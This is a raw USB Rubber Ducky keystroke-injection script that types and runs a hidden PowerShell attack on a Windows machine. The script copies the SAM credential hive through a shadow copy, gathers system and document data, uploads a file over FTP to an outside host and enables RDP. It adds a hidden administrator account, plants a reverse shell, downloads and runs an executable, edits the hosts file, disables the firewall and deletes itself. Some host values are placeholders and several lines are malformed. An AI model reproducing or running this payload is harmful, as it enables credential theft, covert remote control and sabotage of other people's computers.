DELAY 100
GUI r
DELAY 1000
STRING powershell Start-Process notepad -Verb runAs
ENTER
DELAY 100
ALT y
DELAY 100
ENTER
ALT SPACE
DELAY 1000
STRING m
DELAY 1000
DOWNARROW
REPEAT 100
ENTER
STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss')
ENTER
STRING $userDir = (Get-ChildItem env:\userprofile).value + '\Ducky Report ' + $folderDateTime
ENTER
STRING $fileSaveDir = New-Item  ($userDir) -ItemType Directory 
ENTER
STRING $date = get-date 
ENTER
STRING $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
ENTER
STRING $Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html' 
ENTER
STRING $Report = $Report + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
ENTER
STRING $createShadow = (gwmi -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')
ENTER
STRING $shadow = gwmi Win32_ShadowCopy | ? { $_.ID -eq $createShadow.ShadowID } 
ENTER
STRING $addSlash  = $shadow.DeviceObject + '\' 
ENTER
STRING cmd /c mklink C:\shadowcopy $addSlash
ENTER
STRING Copy-Item 'C:\shadowcopy\Windows\System32\config\SAM' $fileSaveDir
ENTER
STRING Remove-Item -recurse -force 'C:\shadowcopy'
ENTER
STRING $Computer = $env:COMPUTERNAME
ENTER
STRING $PortList = 0, 21, 22, 23, 25, 79, 80, 110, 113, 119, 135, 137, 139, 143, 389, 443, 445, 1002, 1024, 1030, 1720, 1900, 5000, 8080
ENTER 
STRING $Report = $Report  + '<div id=right><h3>Port Scan of ' + $Computer + '</h3><table>' 
ENTER 
STRING foreach ($PortNumber in $PortList) { 
ENTER
STRING $PortCheck = New-Object Net.Sockets.TcpClient 
ENTER 
STRING $PortCheck.Connect($Computer, $PortNumber) 
ENTER 
STRING if ($PortCheck.Connected) { 
ENTER
STRING $Report = $Report  +  '<tr><td><b><font color=red>Port ' + $PortNumber + ' is open</font></b></td></tr>'} 
ENTER
STRING else {$Report = $Report  +  '<tr><td>Port ' + $PortNumber + ' is closed</td></tr>'}} 
ENTER
STRING $Report = $Report + '</table></div>' 
ENTER
STRING $Report =  $Report + '<div id=center><h3> Installed Updates</h3>'  
ENTER 
STRING $Report =  $Report +  (Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | sort-object -property installedon -Descending | ConvertTo-Html   Description, HotFixId,Installedon,InstalledBy) 
ENTER  
STRING $Report = $Report + '</div>' 
ENTER
STRING $Report =  $Report + '<div id=center><h3> Installed Programs</h3> ' 
ENTER 
STRING $Report =  $Report + (Get-WmiObject -class Win32_Product | ConvertTo-html  Name, Version,InstallDate) 
ENTER 
STRING $Report = $Report + '</table></div>' 
ENTER
STRING  $u = 0 
ENTER 
STRING $allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace) 
ENTER
STRING $Report =  $Report + '<div id=right><h3>USB Devices</h3><table>' 
ENTER 
STRING do { 
ENTER
STRING $gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB) 
ENTER
STRING $Report = $Report + "<tr><td>Drive Name: </td><td> " + $allUsb[$u].Name + $allUsb[$u].Label + "</td><td>Free Space: </td><td>" + $gbUSB + "GB</td></tr>"
ENTER
STRING Write-Output $fullUSB
ENTER 
STRING $u ++ 
ENTER 
STRING } while ($u -lt $allUsb.Count) 
ENTER 
STRING $Report = $Report + '</table></div>' 
ENTER
STRING $Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>' 
ENTER 
STRING $Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.pdf, *.zip, *.rar -Recurse |convertto-html Directory, Name, LastAccessTime) 
ENTER  
STRING $Report = $Report + '</div>' 
ENTER
STRING $Report =  $Report + '<div id=center><h3>Network Information</h3>' 
ENTER 
STRING $Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html) 
ENTER  
STRING $Report = $Report + '</table></div>' 
ENTER
STRING Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
ENTER
STRING Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 1
ENTER
STRING netsh advfirewall firewall set rule group='remote desktop - remotefx' new enable=Yes 
ENTER
STRING netsh advfirewall firewall set rule group='remote desktop' new enable=Yes 
ENTER
STRING $userDir = (Get-ChildItem env:/userprofile).value 
ENTER 
STRING $filesSaveDir = New-Item $userDir'/Duck' -ItemType Directory 
ENTER
STRING $File = Trojan.docx 
ENTER 
STRING $FileSearch = Get-ChildItem -filter $File  -recurse -path C:/ 
ENTER 
STRING if($FileSearch.Exists){"
ENTER 
STRING if($FileSearch.Count -gt '1'){ 
ENTER 
STRING $NewestFile = Get-ChildItem -filter $File -recurse -path C:/ | select LastWriteTime, Directory" | sort-object LastWriteTime -Descending | Select-Object -First 1
ENTER 
STRING $NewestFile = $NewestFile.Directory.FullName + '/' + $File 
ENTER
STRING Copy-ToZip  $NewestFile $filesSaveDir'/File.zip' 
ENTER
STRING }else{
ENTER 
STRING $FileLoc = Get-ChildItem -filter $File -recurse -path C:/"
ENTER 
STRING $FileLoc = $FileLoc.Directory.FullName + '/' + $File 
ENTER 
STRING Copy-ToZip  $FileLoc $filesSaveDir'/File.zip' 
ENTER 
STRING }} 
ENTER
STRING $final = $filesSaveDir + '/File.zip' 
ENTER 
STRING $ftpAddr =  ftp://admin:admin@ftp.host.com/File.zip
ENTER 
STRING $browser = New-Object System.Net.WebClient 
ENTER 
STRING $url = New-Object System.Uri($ftpAddr) 
ENTER 
STRING $browser.UploadFile($url, $final) 
ENTER
STRING Remove-Item $filesSaveDir -Recurse 
ENTER
STRING Net User Troll JvbG9sb2xvbG9sb29sb2xvbG9sbw==  /ADD 
ENTER
STRING Net LocalGroup Administrators Troll  /ADD  
ENTER 
DELAY 500
STRING reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList' /v Troll /t REG_DWORD /d 0 /f
ENTER
STRING Add-Content "$env:TEMP\52239.ps1" '$c = New-Object System.Net.Sockets.TCPClient("JvbG9sb2xvbG9sb29sb2xvbG9sbw==",JvbG9sb2xvbG9sb29sb2xvbG9sbw==);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + "PS " + (pwd).Path + "> ";$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'
ENTER
STRING start-Process powershell.exe -windowstyle hidden "$env:TEMP\52239.ps1"
ENTER



STRING netsh advfirewall firewall add rule name=Malware dir=in action=allow protocol=JvbG9sb2xvbG9sb29sb2xvbG9sbw==  localport=JvbG9sb2xvbG9sb29sb2xvbG9sbw==  
ENTER 
STRING (New-Object Net.Webclient).DownloadFile('JvbG9sb2xvbG9sb29sb2xvbG9sbw==',"C:\Windows\System32\52239.exe"); Start-Process -FilePath "C:\Windows\System32\52239.exe"
ENTER
STRING $redirectionAddress="JvbG9sb2xvbG9sb29sb2xvbG9sbw=="
ENTER 
STRING $redirectedSite="JvbG9sb2xvbG9sb29sb2xvbG9sbw=="
ENTER
STRING $hosts = $redirectionAddress + ' ' + $redirectedSite
ENTER 
STRING $hosts2 = $redirectionAddress + ' www.' + $redirectedSite
ENTER
STRING Add-Content -Value $hosts -Path 'C:\WINDOWS\SYSTEM32\DRIVERS\ETC\HOSTS'
ENTER
STRING Add-Content -Value $hosts2 -Path 'C:\WINDOWS\SYSTEM32\DRIVERS\ETC\HOSTS'
ENTER
STRING netsh advfirewall set allprofiles state off  
ENTER 
STRING $Report >> $fileSaveDir'/ComputerInfo.html' 
ENTER
STRING function copy-ToZip($fileSaveDir){ 
ENTER 
STRING $srcdir = $fileSaveDir 
ENTER
STRING $zipFile = 'JvbG9sb2xvbG9sb29sb2xvbG9sbw==\Report.zip'
ENTER
STRING if(-not (test-path($zipFile))) { 
ENTER
STRING set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
ENTER 
STRING (dir $zipFile).IsReadOnly = $false} 
ENTER
STRING $shellApplication = new-object -com shell.application
ENTER 
STRING $zipPackage = $shellApplication.NameSpace($zipFile) 
ENTER
STRING $files = Get-ChildItem -Path $srcdir 
ENTER 
STRING foreach($file in $files) { 
ENTER
STRING $zipPackage.CopyHere($file.FullName) 
ENTER 
STRING while($zipPackage.Items().Item($file.name) -eq $null){ 
ENTER
STRING Start-sleep -seconds 1 }}} 
ENTER 
STRING copy-ToZip($fileSaveDir) 
ENTER
STRING remove-item $fileSaveDir -recurse 
ENTER
STRING Remove-Item $MyINvocation.InvocationName 
ENTER
CTRL s
DELAY 100    
STRING C:\Windows\config-52239.ps1
ENTER
DELAY 1000
ALT F4 
DELAY 100  
GUI r 
DELAY 500 
STRING powershell Start-Process cmd -Verb runAs 
ENTER
DELAY 1000
ALT y 
DELAY 100   
STRING mode con:cols=14 lines=1 
ENTER
ALT SPACE 
DELAY 100  
STRING m 
DELAY 1000
DOWNARROW 
REPEAT 100
ENTER
STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false 
ENTER 
DELAY 100  
STRING powershell.exe -windowstyle hidden -File C:\Windows\config-52239.ps1
ENTER
